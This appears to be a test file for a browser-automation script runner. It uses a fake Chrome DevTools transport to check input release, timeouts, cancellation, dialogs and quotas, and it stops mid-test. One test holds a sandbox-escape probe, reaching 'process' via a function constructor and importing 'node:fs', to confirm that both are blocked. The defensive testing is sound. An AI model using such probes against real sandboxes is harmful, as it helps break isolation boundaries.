import { Worker } from 'node:worker_threads';

import { afterEach, describe, expect, it, vi } from 'vitest';

import { BrowserCore } from '../src/index.js';
import { runBrowserScriptWorker } from '../src/browser-script-worker.js';
import type {
  BrowserEvaluateOptions,
  BrowserTransport,
  BrowserTransportCommandOptions,
  BrowserTransportEventListener,
} from '../src/index.js';

/**
 * Minimal page: records input events and answers Runtime.evaluate by running
 * the expression against a tiny in-memory "page" object.
 */
class ScriptPageTransport implements BrowserTransport {
  readonly sessionId = 'script-page';
  readonly input: Array<Record<string, unknown>> = [];
  readonly page = { score: 0, held: new Set<string>() };
  /** The page's location as page JavaScript sees it. */
  location = { href: 'https://shop.example/cart', origin: 'https://shop.example', protocol: 'https:' };
  resets = 0;
  private evaluations = 0;
  /** Transport deadline requested for each Runtime.evaluate. */
  readonly evaluateTimeouts: Array<number | undefined> = [];
  /** Called after each recorded input event. */
  onInput?: (event: Record<string, unknown>) => void | Promise<void>;
  /** Called with the running count before each page evaluation. */
  onEvaluate?: (count: number) => void;
  /** Evaluations of this exact expression never settle until terminateExecution. */
  hangOn?: string;
  /** Key events of this type block until their command signal aborts. */
  blockKeyEvent?: 'keyUp';
  /** Key events of this type fail with a command timeout. */
  failKeyEvent?: 'keyUp';
  /** Keep failing failKeyEvent after a connection reset (unrecoverable page). */
  failKeyEventAfterReset = false;
  /** terminateExecution is acknowledged but the page stays busy. */
  terminateIneffective = false;
  /** This CDP method fails with a command timeout. */
  timeoutMethod?: string;
  /** This CDP method fails with an ordinary (non-timeout) error. */
  failMethod?: string;
  /** This CDP command is sent and never answered, whatever its signal or deadline say. */
  hangCommand?: (method: string, params: Record<string, unknown>) => boolean;
  /** The answer to this CDP command waits for the returned promise. */
  holdCommand?: (method: string, params: Record<string, unknown>) => Promise<void> | undefined;
  /** Called as each other CDP command is sent. */
  onCommand?: (method: string, params: Record<string, unknown>) => void;
  /** Evaluations of this exact expression fail with a command timeout. */
  timeoutEvaluate?: string;
  /**
   * Evaluations containing this text call confirm(): the page shows a confirm
   * and the evaluation answers with its result once Page.handleJavaScriptDialog closes it.
   */
  confirmOn?: string;
  private answerConfirm: ((accepted: boolean) => void) | undefined;
  /** Commands sent while an event was being delivered, as Electron delivers it: on the sender's stack. */
  readonly sentDuringEvent: string[] = [];
  private delivering = false;
  /** Settles when page JavaScript asks for interception: the script has really reached the page. */
  readonly interceptionAsked = Promise.withResolvers<void>();
  /** Every other CDP command, in order (Fetch.*, Network.*, ...). */
  readonly commands: Array<{ method: string; params: Record<string, unknown> }> = [];
  terminations = 0;
  private requests = 0;
  private readonly hung = new Set<(error: Error) => void>();
  private readonly listeners = new Set<BrowserTransportEventListener>();

  start(): Promise<void> {
    return Promise.resolve();
  }

  async resetConnection(): Promise<void> {
    this.resets += 1;
    if (!this.failKeyEventAfterReset) this.failKeyEvent = undefined;
    this.input.push({ method: 'resetConnection' });
  }

  async stopLoading(): Promise<void> {}
  async close(): Promise<void> {}
  async waitForEvent(): Promise<unknown> {
    return undefined;
  }

  onEvent(listener: BrowserTransportEventListener): () => void {
    this.listeners.add(listener);
    return () => this.listeners.delete(listener);
  }

  async send<T = unknown>(
    method: string,
    params: Record<string, unknown> = {},
    _sessionId?: string,
    options?: BrowserTransportCommandOptions,
  ): Promise<T> {
    if (this.delivering) this.sentDuringEvent.push(method);
    if (method === 'Fetch.enable') this.interceptionAsked.resolve();
    if (this.hangCommand?.(method, params)) {
      this.commands.push({ method, params });
      return Promise.withResolvers<T>().promise;
    }
    if (options?.signal?.aborted) {
      throw Object.assign(new Error('ABORTED: command aborted'), { code: 'ABORTED' });
    }
    if (method === this.timeoutMethod) {
      throw Object.assign(new Error(`BROWSER_OPERATION_TIMEOUT: ${method}`), {
        code: 'BROWSER_OPERATION_TIMEOUT',
      });
    }
    if (method === this.failMethod) throw new Error(`${method} is not allowed on this target`);
    if (method === 'Input.insertText') {
      this.input.push({ method, ...params });
      return {} as T;
    }
    if (method === 'Input.dispatchKeyEvent' || method === 'Input.dispatchMouseEvent') {
      if (method === 'Input.dispatchKeyEvent' && params.type === this.failKeyEvent) {
        throw Object.assign(new Error('BROWSER_OPERATION_TIMEOUT: keyUp'), {
          code: 'BROWSER_OPERATION_TIMEOUT',
        });
      }
      if (method === 'Input.dispatchKeyEvent' && params.type === this.blockKeyEvent && options?.signal) {
        // Models a dispatch that is still in flight when the script is cancelled.
        const { promise, reject } = Promise.withResolvers<T>();
        options.signal.addEventListener('abort', () =>
          reject(Object.assign(new Error('ABORTED: command aborted'), { code: 'ABORTED' })),
        );
        return promise;
      }
      const event = { method, ...params };
      this.input.push(event);
      if (params.type === 'keyDown') this.page.held.add(String(params.code));
      if (params.type === 'keyUp') this.page.held.delete(String(params.code));
      // A pending hook models a slow CDP response: the page already applied
      // the event, but the caller has not heard back yet.
      await this.onInput?.(event);
      return {} as T;
    }
    if (method === 'Runtime.terminateExecution') {
      this.terminations += 1;
      if (this.terminateIneffective) return {} as T;
      for (const reject of this.hung) reject(new Error('Execution was terminated'));
      this.hung.clear();
      return {} as T;
    }
    if (method === 'Page.handleJavaScriptDialog') {
      const answer = this.answerConfirm;
      if (!answer) throw new Error('No dialog is showing');
      this.answerConfirm = undefined;
      for (const listener of [...this.listeners]) {
        listener({ method: 'Page.javascriptDialogClosed', params: { result: params.accept } });
      }
      answer(params.accept === true);
      return {} as T;
    }
    if (method === 'Runtime.evaluate') {
      this.evaluations += 1;
      this.evaluateTimeouts.push(options?.timeoutMs);
      this.onEvaluate?.(this.evaluations);
      const expression = String(params.expression);
      if (this.timeoutEvaluate && String(params.expression) === this.timeoutEvaluate) {
        throw Object.assign(new Error('BROWSER_OPERATION_TIMEOUT: Runtime.evaluate'), {
          code: 'BROWSER_OPERATION_TIMEOUT',
        });
      }
      if (this.hangOn && expression.includes(this.hangOn)) {
        // Like a sync loop in Chrome: aborting the command only stops waiting
        // for it; the page stays busy until Runtime.terminateExecution.
        const { promise, reject } = Promise.withResolvers<T>();
        this.hung.add(reject);
        options?.signal?.addEventListener('abort', () =>
          reject(Object.assign(new Error('ABORTED: command aborted'), { code: 'ABORTED' })),
        );
        return promise;
      }
      if (this.confirmOn && expression.includes(this.confirmOn)) {
        const answered = Promise.withResolvers<boolean>();
        this.answerConfirm = answered.resolve;
        for (const listener of [...this.listeners]) {
          listener({
            method: 'Page.javascriptDialogOpening',
            params: { type: 'confirm', message: 'Empty the cart?', url: this.location.href, defaultPrompt: '' },
          });
        }
        // Aborting the command stops waiting for it, as in Chrome; the page
        // stays paused on the dialog until it is answered.
        const aborted = Promise.withResolvers<never>();
        options?.signal?.addEventListener('abort', () =>
          aborted.reject(Object.assign(new Error('ABORTED: command aborted'), { code: 'ABORTED' })),
        );
        return { result: { value: await Promise.race([answered.promise, aborted.promise]) } } as T;
      }
      if (this.hung.size > 0) throw new Error('page is busy');
      const page = this.page;
      // eslint-disable-next-line no-new-func -- test page stands in for Chrome's evaluator
      const value = new Function('page', 'location', 'request', 'commit', `return (${expression});`)(
        page,
        this.location,
        // A request the page JavaScript starts, as Chrome reports it to Fetch while it is intercepted.
        (url: string, method: string) => this.emitPaused(url, method),
        // The main frame commits a new document at `url`.
        (url: string) => this.commitMainFrame(url),
      );
      return { result: { value: await value } } as T;
    }
    if (method === 'Page.captureScreenshot') {
      return { data: Buffer.from('fake-png').toString('base64') } as T;
    }
    if (method === 'Runtime.enable' || method === 'Page.enable' || method === 'DOM.enable') {
      return {} as T;
    }
    if (method === 'Page.getLayoutMetrics') {
      return { cssLayoutViewport: { clientWidth: 800, clientHeight: 600 } } as T;
    }
    this.commands.push({ method, params });
    this.onCommand?.(method, params);
    await this.holdCommand?.(method, params);
    return {} as T;
  }

  emitPaused(url: string, method: string): string {
    this.requests += 1;
    const requestId = `interception-${this.requests}`;
    this.delivering = true;
    for (const listener of this.listeners) {
      listener({ method: 'Fetch.requestPaused', params: { requestId, request: { url, method } } });
    }
    this.delivering = false;
    return requestId;
  }

  commitMainFrame(url: string): void {
    const next = new URL(url);
    Object.assign(this.location, { href: next.href, origin: next.origin, protocol: next.protocol });
    for (const listener of [...this.listeners]) {
      listener({ method: 'Page.frameNavigated', params: { frame: { id: 'main', url: next.href } } });
    }
  }

  get hungEvaluations(): number {
    return this.hung.size;
  }

  async evaluate<T = unknown>(expression: string, _options?: BrowserEvaluateOptions): Promise<T> {
    const result = await this.send<{ result: { value: T } }>('Runtime.evaluate', { expression });
    return result.result.value;
  }

  keyEvents(): Array<{ type: unknown; code: unknown; modifiers: unknown }> {
    return this.input
      .filter((event) => event.method === 'Input.dispatchKeyEvent')
      .map((event) => ({ type: event.type, code: event.code, modifiers: event.modifiers }));
  }
}

function createSession(
  transport: ScriptPageTransport,
  captureGate: Promise<void> = Promise.resolve(),
  onCapture: () => void = () => undefined,
) {
  const core = new BrowserCore({ provider: 'test', version: 1, actions: ['run_script'] as const });
  return core.createSession(transport, {
    captureScreenshot: async () => {
      onCapture();
      await captureGate;
      return { data: Buffer.from('fake-png').toString('base64'), format: 'png', width: 800, height: 600 };
    },
  });
}

type ScriptResult = {
  success: boolean;
  code?: string;
  value?: unknown;
  logs: Array<{ level: string; text: string }>;
  error?: { name: string; message: string; location?: { line: number; column: number } };
  pageEvaluate: { calls: number; sites: Array<{ api: string; line: number; calls: number }> };
  input: { keyEvents: number; mouseEvents: number; autoReleased: string[] };
  inputApiCalls: number;
  screenshots: Array<{ label: string; reason: string }>;
};

async function run(
  transport: ScriptPageTransport,
  code: string,
  extra: Record<string, unknown> = {},
  signal?: AbortSignal,
): Promise<ScriptResult> {
  return (await createSession(transport).execute(
    'run_script',
    { code, ...extra },
    signal,
  )) as ScriptResult;
}

describe('Browser run_script', () => {
  it('holds a modifier and a movement key across repeated clicks, then releases in order', async () => {
    const transport = new ScriptPageTransport();
    const result = await run(
      transport,
      `
      await page.keyboard.down('Shift');
      await page.keyboard.down('KeyD');
      for (let i = 0; i < 3; i += 1) await page.mouse.click(100, 120);
      await page.keyboard.up('KeyD');
      await page.keyboard.up('Shift');
      return { clicks: 3 };
      `,
    );

    expect(result.success).toBe(true);
    expect(result.value).toEqual({ clicks: 3 });
    expect(transport.keyEvents()).toEqual([
      { type: 'keyDown', code: 'ShiftLeft', modifiers: 8 },
      { type: 'keyDown', code: 'KeyD', modifiers: 8 },
      { type: 'keyUp', code: 'KeyD', modifiers: 8 },
      { type: 'keyUp', code: 'ShiftLeft', modifiers: 0 },
    ]);
    const presses = transport.input.filter((event) => event.type === 'mousePressed');
    expect(presses).toHaveLength(3);
    // Clicks made while Shift is held carry the modifier, as a physical click would.
    expect(presses.every((event) => event.modifiers === 8 && event.x === 100)).toBe(true);
    expect(result.input.autoReleased).toEqual([]);
  });

  it('releases keys and buttons that the script left held when it throws', async () => {
    const transport = new ScriptPageTransport();
    const result = await run(
      transport,
      `await page.keyboard.down('ArrowUp');\nawait page.mouse.move(40, 60);\nawait page.mouse.down();\nthrow new Error('boom');`,
    );

    expect(result.success).toBe(false);
    expect(result.code).toBe('SCRIPT_ERROR');
    expect(result.error?.location?.line).toBe(4);
    expect(result.input.autoReleased).toEqual(['mouse:left', 'ArrowUp']);
    expect(transport.page.held.size).toBe(0);
    expect(transport.input.at(-2)).toMatchObject({ type: 'mouseReleased', button: 'left', x: 40, y: 60 });
    expect(transport.input.at(-1)).toMatchObject({ type: 'keyUp', code: 'ArrowUp' });
    expect(result.screenshots).toEqual([expect.objectContaining({ reason: 'failure' })]);
  });

  it('auto-releases a Shift-held letter with the same key value it was pressed with', async () => {
    const transport = new ScriptPageTransport();
    await run(transport, "await page.keyboard.down('Shift');\nawait page.keyboard.down('KeyD');\nthrow new Error('x');");

    const keyD = transport.input.filter(
      (event) => event.method === 'Input.dispatchKeyEvent' && event.code === 'KeyD',
    );
    // Pages that track event.key must see the pair close: "D" down, "D" up.
    expect(keyD.map((event) => [event.type, event.key])).toEqual([
      ['keyDown', 'D'],
      ['keyUp', 'D'],
    ]);
  });

  it('retries an undelivered release after the connection is reset', async () => {
    const transport = new ScriptPageTransport();
    // keyUp times out on the original connection and succeeds after reset.
    transport.failKeyEvent = 'keyUp';
    const session = createSession(transport);

    await expect(
      session.execute('run_script', { code: "await page.keyboard.down('ArrowLeft');\nreturn 'done';" }),
    ).rejects.toThrow(/could not release held input \(ArrowLeft\)/u);

    expect(transport.resets).toBe(1);
    expect(transport.page.held.size).toBe(0);
    expect(session.requiresRecreation).toBe(false);
  });

  it('poisons the session when the release still fails after reset', async () => {
    const transport = new ScriptPageTransport();
    transport.failKeyEvent = 'keyUp';
    transport.failKeyEventAfterReset = true;
    const session = createSession(transport);

    await expect(
      session.execute('run_script', { code: "await page.keyboard.down('ArrowLeft');\nreturn 'done';" }),
    ).rejects.toThrow(/could not release held input/u);

    // The page may still hold ArrowLeft: the provider must recreate it.
    expect(transport.page.held.has('ArrowLeft')).toBe(true);
    expect(session.requiresRecreation).toBe(true);
  });

  it('times out a long wait, releases held keys, and reports SCRIPT_TIMEOUT', async () => {
    // Real clock on purpose: the deadline terminates a worker thread, which
    // fake timers in this thread cannot drive.
    const transport = new ScriptPageTransport();
    const startedAt = Date.now();
    const result = await run(
      transport,
      `await page.keyboard.down('KeyW');\nawait page.waitForTimeout(30000);`,
      { timeout: 1_000 },
    );

    expect(Date.now() - startedAt).toBeLessThan(5_000);
    expect(result.code).toBe('SCRIPT_TIMEOUT');
    expect(result.input.autoReleased).toEqual(['KeyW']);
    expect(transport.page.held.size).toBe(0);
  });

  it('terminates a busy loop that never yields to the bridge', async () => {
    // Real clock on purpose: only worker termination can stop a sync loop.
    const transport = new ScriptPageTransport();
    const result = await run(transport, 'for (;;) {}', { timeout: 1_000 });

    expect(result.code).toBe('SCRIPT_TIMEOUT');
  });

  it('releases held input and reports cancellation when the caller aborts', async () => {
    const transport = new ScriptPageTransport();
    const controller = new AbortController();
    transport.onInput = (event) => {
      if (event.type === 'keyDown' && event.code === 'KeyA') controller.abort();
    };
    const pending = run(
      transport,
      `await page.keyboard.down('Shift');\nawait page.keyboard.down('KeyA');\nawait page.waitForTimeout(20000);`,
      {},
      controller.signal,
    );

    await expect(pending).rejects.toThrow(/cancelled/u);
    expect(transport.page.held.size).toBe(0);
    // Release must reach the page on the connection that pressed the keys,
    // i.e. before interruption recovery replaces that connection.
    const order = transport.input.map((event) => `${event.method}:${event.type ?? ''}`);
    const reset = order.indexOf('resetConnection:');
    expect(reset).toBeGreaterThan(-1);
    expect(order.lastIndexOf('Input.dispatchKeyEvent:keyUp')).toBeLessThan(reset);
  });

  it('records page.evaluate call sites and waits on page state', async () => {
    const transport = new ScriptPageTransport();
    // The page changes on the third evaluation, i.e. while waitForFunction polls.
    transport.onEvaluate = (count) => {
      if (count === 3) transport.page.score = 5;
    };
    const result = await run(
      transport,
      [
        'const before = await page.evaluate(() => page.score);',
        'await page.waitForFunction((min) => page.score >= min, 5, { polling: 20 });',
        'for (let i = 0; i < 2; i += 1) await page.evaluate(() => page.score);',
        'return before;',
      ].join('\n'),
    );

    expect(result.success).toBe(true);
    expect(result.value).toBe(0);
    // Polling counts as one call: the record is about where page JS was used.
    expect(result.pageEvaluate.calls).toBe(4);
    expect(result.pageEvaluate.sites).toEqual([
      expect.objectContaining({ api: 'evaluate', line: 1, calls: 1 }),
      expect.objectContaining({ api: 'waitForFunction', line: 2, calls: 1 }),
      expect.objectContaining({ api: 'evaluate', line: 3, calls: 2 }),
    ]);
  });

  it('ends at a confirm its page JavaScript opens, keeps the connection, and runs again after handle_js_dialog', async () => {
    const transport = new ScriptPageTransport();
    transport.confirmOn = 'confirmEmptyCart';
    const session = createSession(transport);
    const startedAt = Date.now();

    const result = (await session.execute('run_script', {
      code: 'return await page.evaluate(() => "confirmEmptyCart" && page.score);',
      timeout: 20_000,
    })) as Record<string, unknown>;

    // Well before the 20 s script deadline: the dialog ends the action.
    expect(Date.now() - startedAt).toBeLessThan(5_000);
    const dialogId = session.jsDialog?.dialogId;
    expect(result).toMatchObject({
      success: false,
      code: 'BROWSER_JS_DIALOG_ACTIVE',
      dialog: { dialogId, type: 'confirm' },
      trigger: 'run_script',
      retryable: false,
    });
    expect(transport.resets).toBe(0);
    expect(session.requiresRecreation).toBe(false);

    await session.execute('inspect', {});
    expect(await session.execute('handle_js_dialog', { dialogId, action: 'accept' })).toEqual({
      success: true,
      handled: true,
      type: 'confirm',
      action: 'accept',
    });
    expect(session.jsDialog).toBeNull();

    transport.page.score = 7;
    const next = (await session.execute('run_script', {
      code: 'return await page.evaluate(() => page.score);',
    })) as ScriptResult;
    expect(next).toMatchObject({ success: true, value: 7 });
    expect(transport.resets).toBe(0);
    // The interrupted page.evaluate was not terminated: that would kill the
    // page code that runs after the confirm is answered.
    expect(transport.terminations).toBe(0);
    expect(session.requiresRecreation).toBe(false);
  });

  it('counts keyboard and mouse API calls, including insertText and refused calls', async () => {
    const reading = await run(
      new ScriptPageTransport(),
      'await page.screenshot();\nreturn await page.evaluate(() => page.score);',
    );
    const typing = await run(
      new ScriptPageTransport(),
      // insertText dispatches no key event; mouse.down without a position is refused.
      "await page.keyboard.insertText('hi');\ntry { await page.mouse.down(); } catch {}\nreturn 1;",
    );

    expect(reading).toMatchObject({ success: true, inputApiCalls: 0 });
    expect(typing).toMatchObject({
      success: true,
      inputApiCalls: 2,
      input: { keyEvents: 0, mouseEvents: 0 },
    });
  });

  it('reports failed assertions with the script line', async () => {
    const transport = new ScriptPageTransport();
    const result = await run(transport, `const n = 1;\nassert.equal(n, 2, 'mismatch count');`, {
      filename: 'e2e/play.js',
    });

    expect(result.code).toBe('SCRIPT_ASSERTION_FAILED');
    expect(result.error).toMatchObject({
      name: 'AssertionError',
      message: 'mismatch count',
      location: { line: 2 },
    });
  });

  it('reports syntax errors without running anything', async () => {
    const transport = new ScriptPageTransport();
    const result = await run(transport, `await page.keyboard.down('KeyA');\nlet = ;`);

    expect(result.code).toBe('SCRIPT_SYNTAX_ERROR');
    expect(result.error?.location?.line).toBe(2);
    expect(transport.input).toEqual([]);
  });

  it('gives the script no Node.js or host capabilities', async () => {
    // The script probes dynamic import on purpose: the module-loading boundary is under test.
    const transport = new ScriptPageTransport();
    const result = await run(
      transport,
      `return {
        process: typeof process,
        require: typeof require,
        viaConstructor: (() => { try { return typeof page.mouse.move.constructor('return process')(); } catch (e) { return 'blocked'; } })(),
        importBlocked: await import('node:fs').then(() => false, () => true),
      };`,
    );

    expect(result.value).toEqual({
      process: 'undefined',
      require: 'undefined',
      viaConstructor: 'blocked',
      importBlocked: true,
    });
  });

  it('bounds screenshots and logs', async () => {
    const transport = new ScriptPageTransport();
    const result = (await run(
      transport,
      `for (let i = 0; i < 6; i += 1) await page.screenshot({ label: 'shot-' + i });
       for (let i = 0; i < 500; i += 1) console.log('line', i);`,
    )) as ScriptResult & { screenshotsSkipped?: number; logsTruncated?: { omittedEntries: number } };

    expect(result.screenshots.map((shot) => shot.label)).toEqual([
      'shot-0',
      'shot-1',
      'shot-2',
      'shot-3',
    ]);
    expect(result.screenshotsSkipped).toBe(2);
    expect(result.logs).toHaveLength(200);
    expect(result.logsTruncated?.omittedEntries).toBe(300);
  });

  it('drops over-quota logs inside the worker instead of posting them to the host', async () => {
    let received = 0;
    let omitted = 0;
    const outcome = await runBrowserScriptWorker({
      code: "for (let i = 0; i < 100000; i += 1) console.log('x');\nreturn 'done';",
      filename: 'log-flood.js',
      timeoutMs: 20_000,
      maxCalls: 10,
      signal: new AbortController().signal,
      handle: async () => undefined,
      onLog: () => {
        received += 1;
      },
      onOmittedLogs: (count) => {
        omitted += count;
      },
      onSettle: () => undefined,
      onStalled: () => undefined,
    });

    // Only the quota crosses the thread boundary; the rest is counted.
    expect(outcome).toMatchObject({ status: 'completed' });
    expect(received).toBe(200);
    expect(omitted).toBe(99_800);
  });

  it('stops page JavaScript that outlives the script so the tab stays usable', async () => {
    // Real clock on purpose: the script deadline terminates a worker thread.
    const transport = new ScriptPageTransport();
    transport.hangOn = 'spinForever';
    const session = createSession(transport);

    const stuck = (await session.execute(
      'run_script',
      { code: 'await page.evaluate(function spinForever() { for (;;) {} });', timeout: 1_000 },
    )) as ScriptResult;
    const next = (await session.execute('run_script', {
      code: 'return await page.evaluate(() => page.score);',
    })) as ScriptResult;

    expect(stuck.code).toBe('SCRIPT_TIMEOUT');
    expect(transport.terminations).toBe(1);
    expect(transport.hungEvaluations).toBe(0);
    expect(next).toMatchObject({ success: true, value: 0 });
  });

  it('releases a typed key whose keyUp was still in flight when the script was cancelled', async () => {
    const transport = new ScriptPageTransport();
    transport.blockKeyEvent = 'keyUp';
    const controller = new AbortController();
    transport.onInput = (event) => {
      if (event.type === 'keyDown' && event.code === 'KeyW') {
        // keyDown reached the page; the next keyUp blocks until abort.
        controller.abort();
      }
    };
    const pending = run(transport, "await page.keyboard.type('w');", {}, controller.signal);
    await expect(pending).rejects.toThrow(/cancelled/u);

    // Release uses a fresh deadline without the aborted signal, so it is not blocked.
    expect(transport.page.held.size).toBe(0);
    expect(transport.keyEvents().at(-1)).toMatchObject({ type: 'keyUp', code: 'KeyW' });
  });

  it('keeps the screenshot limit when captures run concurrently', async () => {
    const transport = new ScriptPageTransport();
    const gate = Promise.withResolvers<void>();
    const session = createSession(transport, gate.promise);
    transport.onEvaluate = () => gate.resolve();

    const result = (await session.execute('run_script', {
      code: [
        "const shots = [1, 2, 3, 4, 5, 6].map((i) => page.screenshot({ label: 'p' + i }));",
        'await page.evaluate(() => 0);',
        'return (await Promise.all(shots)).map((shot) => shot.captured);',
      ].join('\n'),
    })) as ScriptResult & { screenshotsSkipped?: number };

    expect(result.value).toEqual([true, true, true, true, false, false]);
    expect(result.screenshots).toHaveLength(4);
    expect(result.screenshotsSkipped).toBe(2);
  });

  it('keeps input ordered when the script issues key calls concurrently', async () => {
    const transport = new ScriptPageTransport();
    const secondDown = Promise.withResolvers<void>();
    let keyDowns = 0;
    let keyUps = 0;
    transport.onInput = async (event) => {
      if (event.code !== 'KeyW') return;
      if (event.type === 'keyDown' && ++keyDowns === 2) secondDown.resolve();
      // Hold the first keyUp response until the concurrent keyDown has been
      // dispatched (the race), or for a few event-loop turns, enough for its
      // worker message to arrive and be queued behind this keyUp. Turns, not
      // wall-clock time: the bridge call crosses a worker thread.
      if (event.type === 'keyUp' && ++keyUps === 1) {
        const turns = (async () => {
          for (let turn = 0; turn < 10; turn += 1) {
            await new Promise<void>((resolve) => setImmediate(resolve));
          }
        })();
        await Promise.race([secondDown.promise, turns]);
      }
    };

    const result = await run(
      transport,
      [
        "await page.keyboard.down('KeyW');",
        "await Promise.all([page.keyboard.up('KeyW'), page.keyboard.down('KeyW')]);",
      ].join('\n'),
    );

    // The second keyDown is still held at the end, so the runtime must release it.
    expect(result.input.autoReleased).toEqual(['KeyW']);
    expect(transport.page.held.size).toBe(0);
    expect(transport.keyEvents().map((event) => event.type)).toEqual([
      'keyDown',
      'keyUp',
      'keyDown',
      'keyUp',
    ]);
  });

  it('surfaces a CDP timeout to Browser Core even when the script catches it', async () => {
    const transport = new ScriptPageTransport();
    transport.timeoutMethod = 'Input.insertText';

    await expect(
      run(
        transport,
        "try { await page.keyboard.insertText('hi'); } catch { /* swallowed */ }\nreturn 'ok';",
      ),
    ).rejects.toThrow(/BROWSER_OPERATION_TIMEOUT/u);
    // The side effect of the timed-out command is uncertain: Core resets the connection.
    expect(transport.resets).toBe(1);
  });

  it('rejects typing a key the script is holding instead of silently ending the hold', async () => {
    const transport = new ScriptPageTransport();
    const result = await run(
      transport,
      [
        "await page.keyboard.down('KeyW');",
        "const typed = await page.keyboard.type('w').then(() => 'typed', (error) => error.code);",
        'return { typed, heldInPage: await page.evaluate(() => [...page.held]) };',
      ].join('\n'),
    );

    expect(result.value).toEqual({ typed: 'KEY_ALREADY_HELD', heldInPage: ['KeyW'] });
    expect(result.input.autoReleased).toEqual(['KeyW']);
  });

  it('sends the shifted character for digits and punctuation while Shift is held', async () => {
    const transport = new ScriptPageTransport();
    await run(
      transport,
      "await page.keyboard.down('Shift');\nawait page.keyboard.press('Digit1');\nawait page.keyboard.press('Slash');\nawait page.keyboard.up('Shift');",
    );

    const downs = transport.input.filter(
      (event) => event.type === 'keyDown' && event.code !== 'ShiftLeft',
    );
    expect(downs.map((event) => [event.code, event.key, event.text])).toEqual([
      ['Digit1', '!', '!'],
      ['Slash', '?', '?'],
    ]);
    const ups = transport.input.filter(
      (event) => event.type === 'keyUp' && event.code !== 'ShiftLeft',
    );
    expect(ups.map((event) => event.key)).toEqual(['!', '?']);
  });

  it('poisons the session when stuck page JavaScript cannot be stopped even after reconnecting', async () => {
    // Real clock on purpose: the script deadline terminates a worker thread.
    const transport = new ScriptPageTransport();
    transport.hangOn = 'spinForever';
    transport.terminateIneffective = true;
    const session = createSession(transport);

    await expect(
      session.execute('run_script', {
        code: 'await page.evaluate(function spinForever() { for (;;) {} });',
        timeout: 1_000,
      }),
    ).rejects.toThrow(/could not be stopped/u);
    expect(transport.resets).toBe(1);
    // A reconnect does not stop the page loop: the page must be recreated.
    expect(session.requiresRecreation).toBe(true);
  });

  it('gives a waitForFunction poll a transport deadline that covers its condition timeout', async () => {
    const transport = new ScriptPageTransport();
    await run(transport, 'await page.waitForFunction(() => true, null, { timeout: 20000 });', {
      timeout: 30_000,
    });

    // The poll may legitimately run up to the 20 s condition budget, beyond
    // the 10 s limit of a plain page.evaluate.
    const pollDeadline = transport.evaluateTimeouts.find((timeout) => (timeout ?? 0) > 10_000);
    expect(pollDeadline).toBeGreaterThanOrEqual(20_000 - 100);
  });

  it('does not accept a waitForFunction condition that becomes true after its timeout', async () => {
    // Real clock on purpose: the page-side deadline uses the page's timers.
    const transport = new ScriptPageTransport();
    const result = await run(
      transport,
      [
        'const outcome = await page',
        '  .waitForFunction(() => new Promise((resolve) => setTimeout(() => resolve(true), 400)), null, { timeout: 100 })',
        "  .then(() => 'passed', (error) => error.name);",
        'return outcome;',
      ].join('\n'),
    );

    expect(result.value).toBe('TimeoutError');
  });

  it('types characters without a physical key, such as CJK, emoji and line breaks, as inserted text', async () => {
    const transport = new ScriptPageTransport();
    await run(transport, "await page.keyboard.type('a你😀!\\n');");

    // What the page receives, in order: key events carry their text, the rest is insertText.
    const received = transport.input.flatMap((event) =>
      event.method === 'Input.insertText'
        ? [`insert:${String(event.text)}`]
        : event.type === 'keyDown'
          ? [`key:${String(event.code)}:${String(event.text)}`]
          : [],
    );
    expect(received).toEqual(['key:KeyA:a', 'insert:你', 'insert:😀', 'key:Digit1:!', 'insert:\n']);
  });

  it('runs concurrent clicks as whole gestures at their own positions', async () => {
    const transport = new ScriptPageTransport();
    await run(transport, 'await Promise.all([page.mouse.click(50, 50), page.mouse.click(250, 50)]);');

    const gestures = transport.input
      .filter((event) => event.method === 'Input.dispatchMouseEvent')
      .map((event) => `${String(event.type)}@${String(event.x)}`);
    expect(gestures).toEqual([
      'mouseMoved@50',
      'mousePressed@50',
      'mouseReleased@50',
      'mouseMoved@250',
      'mousePressed@250',
      'mouseReleased@250',
    ]);
  });

  it('rejects deepEqual on Set, Map and Date instead of treating different values as equal', async () => {
    const transport = new ScriptPageTransport();
    const result = await run(
      transport,
      [
        'const outcomes = [];',
        "for (const [a, b] of [[new Set(['KeyW']), new Set()], [new Date(0), new Date(1000)], [new Map(), new Map([[1, 2]])]]) {",
        "  try { assert.deepEqual(a, b); outcomes.push('equal'); } catch (error) { outcomes.push(error.name); }",
        '}',
        "assert.deepEqual({ held: [] }, { held: [] });",
        'return outcomes;',
      ].join('\n'),
    );

    expect(result).toMatchObject({ success: true, value: ['TypeError', 'TypeError', 'TypeError'] });
  });

  it('reports a page.evaluate that was still pending when the script timed out', async () => {
    // Real clock on purpose: the script deadline terminates a worker thread.
    const transport = new ScriptPageTransport();
    transport.hangOn = 'pendingContinuation';
    // terminateExecution answers, but an async continuation is not cancelled by it.
    const result = await run(
      transport,
      'await page.evaluate(async function pendingContinuation() { await new Promise(() => {}); });',
      { timeout: 1_000 },
    );

    expect(result.code).toBe('SCRIPT_TIMEOUT');
    expect(result).toMatchObject({ pageEvaluate: { interrupted: 1 } });
    expect((result as ScriptResult & { recovery?: string }).recovery).toMatch(/may still finish/u);
  });

  it('reports a waitForFunction condition left running after its timeout, even when the script catches it', async () => {
    // Real clock on purpose: the page-side deadline uses the page's timers.
    const transport = new ScriptPageTransport();
    const result = (await run(
      transport,
      [
        'await page',
        '  .waitForFunction(() => new Promise((resolve) => setTimeout(() => resolve(true), 400)), null, { timeout: 100 })',
        '  .catch(() => undefined);',
        "return 'caught';",
      ].join('\n'),
    )) as ScriptResult & { recovery?: string };

    expect(result).toMatchObject({ success: true, value: 'caught', pageEvaluate: { interrupted: 1 } });
    expect(result.recovery).toMatch(/may still finish/u);
  });

  it('fails a completed script when the action is cancelled during cleanup', async () => {
    const transport = new ScriptPageTransport();
    const controller = new AbortController();
    // The script returns with ArrowUp held; cancel while its release is in flight.
    transport.onInput = (event) => {
      if (event.type === 'keyUp' && event.code === 'ArrowUp') controller.abort();
    };

    await expect(
      run(transport, "await page.keyboard.down('ArrowUp');\nreturn 'done';", {}, controller.signal),
    ).rejects.toThrow(/cancelled/u);
    // Input was still released, and the cancelled action ran interruption recovery.
    expect(transport.page.held.size).toBe(0);
    expect(transport.resets).toBe(1);
  });

  it('does not press at an unknown pointer position carried over from another action', async () => {
    const transport = new ScriptPageTransport();
    const session = createSession(transport);
    await session.execute('run_script', { code: 'await page.mouse.move(250, 50);' });
    const firstScriptEvents = transport.input.length;

    const second = (await session.execute('run_script', {
      code: [
        'const refused = await page.mouse.down().then(() => "pressed", (error) => error.code);',
        'await page.mouse.move(120, 80);',
        'return refused;',
      ].join('\n'),
    })) as ScriptResult;

